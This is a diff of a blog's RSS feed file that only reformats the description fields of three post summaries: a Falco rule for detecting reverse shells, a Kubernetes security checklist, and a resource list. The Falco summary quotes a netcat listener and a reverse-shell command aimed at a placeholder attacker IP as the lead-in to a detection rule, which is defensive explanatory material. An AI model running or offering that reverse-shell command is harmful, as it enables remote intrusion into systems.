@@ -13,9 +13,16 @@
       <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/falco-reverse-shell-rules/</guid>
-      <description>Reverse shell tries to circumvent these protections by reversing the roles. It is the target machine that initiates the connection request to the user end.
+      <description>
+        
+          
+            Reverse shell tries to circumvent these protections by reversing the roles. It is the target machine that initiates the connection request to the user end.
 for example
-Netcat can be used to both set up a shell listener and initiate reverse shell connections from the victim machine. Here’s a quick example to setup a shell listener: 1nc -l -p 1234 On the victim side, the attacker would initiate the interactive shell connection with the following command: 1nc -e /bin/bash &amp;lt;attacker IP&amp;gt; 1234 Detect with Falco 1- rule: Netcat Remote Code Execution in Container 2 desc: Netcat Program runs inside container that allows remote code execution 3 condition: &amp;gt; 4 spawned_process and container and 5 ((proc.</description>
+Netcat can be used to both set up a shell listener and initiate reverse shell connections from the victim machine. Here’s a quick example to setup a shell listener: 1nc -l -p 1234 On the victim side, the attacker would initiate the interactive shell connection with the following command: 1nc -e /bin/bash &amp;lt;attacker IP&amp;gt; 1234 Detect with Falco 1- rule: Netcat Remote Code Execution in Container 2 desc: Netcat Program runs inside container that allows remote code execution 3 condition: &amp;gt; 4 spawned_process and container and 5 ((proc.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -24,12 +31,19 @@ Netcat can be used to both set up a shell listener and initiate reverse shell co
       <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/kubernetes-security-checklist/</guid>
-      <description>Cloud native workflow security checklist
+      <description>
+        
+          
+            Cloud native workflow security checklist
 Development security Integrate Code Scanning at the CI/CD Process
 SAST (Static Application Security Testing) tools sonarqube, gosec various language lint itegration the IDE plugins Enabled the gitlab ci security or github action scan Reduce external vulnerabilities via dependency scanning
 various language dependency check(npm, maven, go.mod, reqirements.txt) dependency-check plugin Use image scanning to analyze container images
 Avoid unnecessary privileges
-Rootless containers Make sure the user specified in the USER instruction exists inside the container.</description>
+Rootless containers Make sure the user specified in the USER instruction exists inside the container.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -38,8 +52,15 @@ Rootless containers Make sure the user specified in the USER instruction exists 
       <pubDate>Sat, 05 Mar 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/awesome-open-source/</guid>
-      <description>There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.
-Cloud native and kubernetes https://github.com/labring/sealos(kubernetes-kernel-based cloud os! Let&amp;rsquo;s sealos run kubernetes and applications.) https://github.com/kubevela/kubevela(The Modern Application Platform.) https://github.com/crossplane/crossplane(Cloud Native Control Planes multi cloud resoures) https://promcat.io/(A resource catalog for enterprise-class Prometheus) https://hub.datree.io/(Prevent Kubernetes misconfigurations from reaching production) https://aws.github.io/aws-eks-best-practices/(EKS Best Practices Guides) https://github.com/koderover/zadig(Zadig is a cloud native, distributed, developer-oriented continuous delivery product) https://github.</description>
+      <description>
+        
+          
+            There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.
+Cloud native and kubernetes https://github.com/labring/sealos(kubernetes-kernel-based cloud os! Let&amp;rsquo;s sealos run kubernetes and applications.) https://github.com/kubevela/kubevela(The Modern Application Platform.) https://github.com/crossplane/crossplane(Cloud Native Control Planes multi cloud resoures) https://promcat.io/(A resource catalog for enterprise-class Prometheus) https://hub.datree.io/(Prevent Kubernetes misconfigurations from reaching production) https://aws.github.io/aws-eks-best-practices/(EKS Best Practices Guides) https://github.com/koderover/zadig(Zadig is a cloud native, distributed, developer-oriented continuous delivery product) https://github.
+          
+          
+        
+      </description>
     </item>
     
   </channel>
